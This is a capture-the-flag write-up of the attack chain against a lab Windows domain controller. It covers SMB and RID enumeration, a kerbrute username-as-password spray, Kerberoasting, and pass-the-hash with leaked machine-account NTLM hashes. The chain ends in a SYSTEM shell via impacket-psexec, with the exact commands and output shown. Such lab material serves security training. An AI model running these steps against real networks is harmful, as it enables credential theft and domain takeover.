
## 1. Run an Nmap scan of the network 
```└─$ nmap -A -sC -sV -T4 -Pn 10.10.47.13
Starting Nmap 7.94 ( https://nmap.org ) at 2025-08-03 12:13 EDT
Nmap scan report for 10.10.47.13
Host is up (0.028s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-03 16:14:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   DNS_Tree_Name: SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-03T16:14:01+00:00
|_ssl-date: 2025-08-03T16:14:41+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-06-17T21:35:42
|_Not valid after:  2025-12-17T21:35:42
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-03T16:14:05
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.10 seconds
```
## 2.Attempting to access the shares of the smb port. 

Checking if the there are null authentication to the shares in the DC. 

<img width="987" height="138" alt="image" src="https://github.com/user-attachments/assets/8657d823-53ef-4dfc-a7e4-be2448e1d598" />

there are no list shares for null



Now attempting with an user called "guest".

<img width="1179" height="259" alt="image" src="https://github.com/user-attachments/assets/d3725c8b-475e-4323-931c-60d6a9bb25d1" />

we can authenticate through guest with no password with all of the avaliable list of shares but have no access rights



At this point i have added the IP and the domain controller to the host files under soupedecode.local 


Moving on, starting to enumerating users via RID bruteforce. 

<img width="941" height="737" alt="image" src="https://github.com/user-attachments/assets/653d5580-af34-4548-9a8a-fd34d411577d" />

There are lot of users ! i am going to copy up to 300 users for now and save it as a user.txt file.

Using the apporached commands to cut out certain field/columns of the file so it show only the usernames. 

```
kali㉿kali)-[~]
└─$ cat rids.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

## 3.Performing a Passwordspraying attack to the user accounts via Kerberute.
```
┌──(kali㉿kali)-[~]
└─$ kerbrute1 passwordspray --user-as-pass --dc dc01.soupedecode.local -d soupedecode.local users1.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/09/25 - Ronnie Flathers @ropnop

2025/08/09 10:24:06 >  Using KDC(s):
2025/08/09 10:24:06 >   10.10.67.6:88

2025/08/09 10:24:07 >  [+] VALID LOGIN:  ybob317@soupedecode.local:ybob317
2025/08/09 10:24:08 >  Done! Tested 237 logins (1 successes) in 1.529 seconds

```

1 account has been verified that uses the username as thier password. 

Now i can check what shares thios user has access to. 


```┌──(kali㉿kali)-[~]
└─$ nxc smb soupedecode.local -u ybob317 -p ybob317 --shares
SMB         10.10.67.6      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.67.6      445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB         10.10.67.6      445    DC01             [*] Enumerated shares
SMB         10.10.67.6      445    DC01             Share           Permissions     Remark
SMB         10.10.67.6      445    DC01             -----           -----------     ------
SMB         10.10.67.6      445    DC01             ADMIN$                          Remote Admin
SMB         10.10.67.6      445    DC01             backup                          
SMB         10.10.67.6      445    DC01             C$                              Default share
SMB         10.10.67.6      445    DC01             IPC$            READ            Remote IPC
SMB         10.10.67.6      445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.67.6      445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.67.6      445    DC01             Users           READ
```

The user has read access to the user shares.

So i can now use like smb client with the credentials to authenticate with smb read the content of the shares. 

<img width="940" height="475" alt="image" src="https://github.com/user-attachments/assets/a31dc78c-e8b2-4497-b1b0-72949515f3b0" />

<img width="795" height="216" alt="image" src="https://github.com/user-attachments/assets/9448b458-c475-4060-82a4-0c244dda45f1" />

There is the User.txt flag.


With these valid credentials i can now perform kerberosting to extract service account credentials from the active directory.

The basic process of kerberoating, as an authenticated user i can request a kerberos ticket for a service principle name (SPN).

SPN is a unique ID of a given service account. It tells the kerberos that this service account is running X service in the AD. so if the account has an SPN 
Set as low authenticated user that has low privileges or anything, we can request a TGS ticket for that SPN from the server. The TGS ticket is encrypted so once receievd the ticket, 
I can user offline tools such as Hashcat or JTR to crack the hash. 

I will use Impackets to perform kerberoating. 

```
──(kali㉿kali)-[~]
└─$ impacket-GetUserSPNs 'soupedecode.local/ybob317:ybob317' -request -usersfile users1.txt -dc-ip soupedecode.local
```

<img width="941" height="166" alt="image" src="https://github.com/user-attachments/assets/fac6139d-265f-4e03-b18c-8c7b82a8bf34" />

It gave me a valid TGS for a file SVC service account. So i can now copy the hash of the account and crack it using JTR.

Cracked the hash.


Now i can check what fileshares that file_svc have rights to. 

<img width="941" height="177" alt="image" src="https://github.com/user-attachments/assets/5caf7d9a-00c4-47f7-82fa-a4c9afc907ca" />


Read access to 'backup' 


Now i will authenticate smb as file_svc using the crack password and read the backup share.

<img width="940" height="266" alt="image" src="https://github.com/user-attachments/assets/9a053bbc-e773-4a8e-bdf0-54302dcc25f0" />

Content.

<img width="940" height="266" alt="image" src="https://github.com/user-attachments/assets/53966aa0-1158-4d70-9592-613b016ba0ac" />

Looks like i have the NTLM hashes for different machine accounts.

Im going to create 2 txt files seperating the usernames and the password hashes. 

<img width="941" height="829" alt="image" src="https://github.com/user-attachments/assets/2b9ca9c7-0ac8-46e6-bc14-87a842d407a3" />


I am going to validate these machine credentials using nxc to find out which credentials are valid.

```
┌──(kali㉿kali)-[~]
└─$ nxc smb soupedecode.local -u device.txt -H hashes.txt --no-bruteforce
SMB         10.10.67.6      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.67.6      445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE 
SMB         10.10.67.6      445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE 
SMB         10.10.67.6      445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE 
SMB         10.10.67.6      445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

OK filserver has a valid credentials, again i can check and see what rights this account has in the smb shares.

<img width="940" height="207" alt="image" src="https://github.com/user-attachments/assets/0a5955ba-07f8-45c1-9d35-04cb59e3a997" />

OK, Read,Write access to admin. 

Time to get a shell to the DC. 

```
──(kali㉿kali)-[~]
└─$ impacket-psexec 'soupedecode.local/FileServer$'@soupedecode.local -hashes :e41da7e79a4c76dbd9cf79d1cb325559
Impacket v0.13.0.dev0+20250808.233909.f14ab2f - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on soupedecode.local.....
[*] Found writable share ADMIN$
[*] Uploading file bwVMVfhZ.exe
[*] Opening SVCManager on soupedecode.local.....
[*] Creating service KWCU on soupedecode.local.....
[*] Starting service KWCU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd c:\users\administratordesktop
The system cannot find the path specified.
 
C:\Windows\system32> cd c:\users\administrator\desktop
 
c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is CCB5-C4FB

 Directory of c:\Users\Administrator\Desktop

07/25/2025  10:51 AM    <DIR>          .
08/09/2025  06:49 AM    <DIR>          ..
06/17/2024  10:41 AM    <DIR>          backup
07/25/2025  10:51 AM                33 root.txt
               1 File(s)             33 bytes
               3 Dir(s)  43,427,946,496 bytes free

c:\Users\Administrator\Desktop> 
```

Retieve that root flag. 





```ldapsearch -x -H ldap://10.10.47.13 -s base    
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=SOUPEDECODE,DC=LOCAL
ldapServiceName: SOUPEDECODE.LOCAL:dc01$@SOUPEDECODE.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=L
 OCAL
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=SOUPEDECODE,DC=LOCAL
schemaNamingContext: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
namingContexts: DC=SOUPEDECODE,DC=LOCAL
namingContexts: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
namingContexts: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
namingContexts: DC=DomainDnsZones,DC=SOUPEDECODE,DC=LOCAL
namingContexts: DC=ForestDnsZones,DC=SOUPEDECODE,DC=LOCAL
isSynchronized: TRUE
highestCommittedUSN: 180264
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
dnsHostName: DC01.SOUPEDECODE.LOCAL
defaultNamingContext: DC=SOUPEDECODE,DC=LOCAL
currentTime: 20250803162201.0Z
configurationNamingContext: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL

# search result
search: 2
result: 0 Success
# numResponses: 2
# numEntries: 1
```








